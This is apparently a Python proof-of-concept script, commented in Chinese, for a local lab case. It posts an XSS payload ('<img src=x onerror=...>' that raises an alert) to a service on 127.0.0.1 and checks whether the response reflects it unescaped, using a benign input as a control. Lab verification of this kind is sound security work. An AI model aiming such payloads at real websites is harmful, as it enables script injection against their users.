#!/usr/bin/env python3
# S019 本地最小验证脚本：仅请求 127.0.0.1:4280，不向外部发送数据。
import sys
import urllib.parse
import urllib.request

TARGET = "http://127.0.0.1:4280/lab_cases/S019/index.php"

PAYLOADS = {
    "normal": "S019 normal preview",
    "test": """<img src=x onerror="alert('XSS-S019')">""",
}

def main() -> int:
    mode = sys.argv[1] if len(sys.argv) > 1 else "test"
    if mode not in PAYLOADS:
        print("用法: python3 poc_s019.py normal|test")
        return 2

    payload = PAYLOADS[mode]
    data = urllib.parse.urlencode({"content": payload}).encode("utf-8")
    req = urllib.request.Request(
        TARGET,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode("utf-8", "replace")
            print(f"mode={mode}")
            print(f"HTTP={resp.status}")
            print(f"payload_in_body={payload in body}")
            idx = body.find(payload)
            if idx >= 0:
                print("body_snippet:")
                print(body[max(0, idx - 120):idx + len(payload) + 120])
            else:
                print("body_head:")
                print(body[:500])
    except Exception as exc:
        print(f"请求失败: {exc}")
        return 1

    print("说明：本脚本只验证 HTTP 回显，不触发浏览器 JavaScript。")
    print("人工确认：在浏览器打开入口并提交相同测试输入，观察是否弹出 XSS-S019；普通输入作对照。")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
